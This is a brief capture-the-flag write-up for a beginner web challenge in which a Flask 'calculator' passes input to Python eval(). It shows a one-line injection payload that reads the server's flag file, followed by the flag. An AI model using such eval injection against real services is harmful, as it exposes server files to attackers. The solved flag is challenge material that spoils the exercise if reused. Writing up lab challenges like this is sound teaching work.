# calculator

[library.m0unt41n.ch/challenges/calculator](https://library.m0unt41n.ch/challenges/calculator) ![](../../resources/web.svg) ![](../../resources/baby.svg) 

# TL;DR

What we get from the description:

```
Sometimes I feel like m math just isn't mathing 😞 anyway, I have recently come
across this brand new calculator thingy, that apparently can solve all your
problems 🤩 It can answer all of your questions, including some you didn't even
new you had 🚩
Hint: The flag is located in /src/flag.txt
```

After starting remote instance we see:

*   A prompt: `Just enter all your problems here, and we'll eval() them for you ❤️`
*   And input field
*   A footer: `🧪🐍 Build using Python and Flask! 🧪🐍`

So, assuming that it does what it says, the following input should work:

```
open('/src/flag.txt', 'r').read()
```
... and it does

---

## `SCD{d0nt_tru5t_th3_u53r}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
